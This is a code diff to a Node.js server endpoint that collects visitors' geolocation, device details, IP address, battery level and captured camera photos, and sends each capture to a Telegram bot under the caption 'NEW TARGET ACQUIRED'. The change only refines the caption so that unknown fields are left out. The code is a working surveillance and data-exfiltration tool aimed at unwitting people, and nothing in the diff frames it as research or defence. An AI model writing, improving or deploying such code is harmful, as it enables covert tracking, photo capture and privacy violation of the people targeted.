@@ -137,25 +137,66 @@ app.post('/api/store', async (req, res) => {
         console.log('✅ Stored! Total:', allData.length);
 
         // ==========================================
-        // TELEGRAM CAPTION - No Unknown!
+        // TELEGRAM CAPTION - REAL DATA ONLY!
         // ==========================================
         const device = fullDeviceInfo || deviceDetails || {};
         const loc = location || {};
+        const speed = networkSpeed || {};
         
-        const caption = `
-🔴 <b>NEW TARGET ACQUIRED</b> 🔴
-📍 Location: ${loc.lat || '—'}, ${loc.lng || '—'}
-📱 Device: ${device.deviceName || '—'}
-📱 Model: ${device.deviceModel || '—'}
-🏭 Manufacturer: ${device.manufacturer || '—'}
-📲 OS: ${device.os || '—'} ${device.osVersion || ''}
-📡 IP: ${ipAddress || '—'}
-📶 Network: ${device.connection?.type || '—'}
-🚀 Speed: ${networkSpeed?.download || '—'} Mbps
-🔋 Battery: ${device.battery?.level || '—'}
-📸 Captures: ${captureCount || 1}
-🕐 Time: ${new Date().toISOString()}
-        `;
+        // Build caption lines - sirf real data
+        let captionLines = [];
+        captionLines.push('🔴 <b>NEW TARGET ACQUIRED</b> 🔴');
+        
+        // Location - only if both lat and lng exist
+        if (loc.lat && loc.lng) {
+            captionLines.push(`📍 Location: ${loc.lat}, ${loc.lng}`);
+        }
+        
+        // Device Name - only if real
+        let deviceName = device.manufacturer || '';
+        if (device.deviceModel && device.deviceModel !== '—' && device.deviceModel !== 'Unknown') {
+            deviceName += ' ' + device.deviceModel;
+        } else if (device.deviceName && device.deviceName !== '—' && device.deviceName !== 'Unknown') {
+            deviceName = device.deviceName;
+        }
+        if (deviceName.trim() && deviceName !== '—' && deviceName !== 'Unknown') {
+            captionLines.push(`📱 Device: ${deviceName.trim()}`);
+        }
+        
+        // OS - only if real
+        if (device.os && device.os !== '—' && device.os !== 'Unknown') {
+            let osStr = device.os;
+            if (device.osVersion && device.osVersion !== '—' && device.osVersion !== 'Unknown') {
+                osStr += ' ' + device.osVersion;
+            }
+            captionLines.push(`📲 OS: ${osStr}`);
+        }
+        
+        // IP - only if real
+        if (ipAddress && ipAddress !== '—' && ipAddress !== 'Unknown') {
+            captionLines.push(`📡 IP: ${ipAddress}`);
+        }
+        
+        // Network - only if real
+        if (device.connection?.type && device.connection.type !== '—' && device.connection.type !== 'Unknown') {
+            captionLines.push(`📶 Network: ${device.connection.type}`);
+        }
+        
+        // Speed - only if real
+        if (speed.download && speed.download !== '—' && speed.download !== 'Unknown') {
+            captionLines.push(`🚀 Speed: ${speed.download} Mbps`);
+        }
+        
+        // Battery - only if real
+        if (device.battery?.level && device.battery.level !== '—' && device.battery.level !== 'Unknown') {
+            captionLines.push(`🔋 Battery: ${device.battery.level}`);
+        }
+        
+        // Captures count
+        captionLines.push(`📸 Captures: ${captureCount || 1}`);
+        captionLines.push(`🕐 Time: ${new Date().toISOString()}`);
+        
+        const caption = captionLines.join('\n');
 
         if (userPhoto) {
             await sendTelegramPhoto(userPhoto, caption);
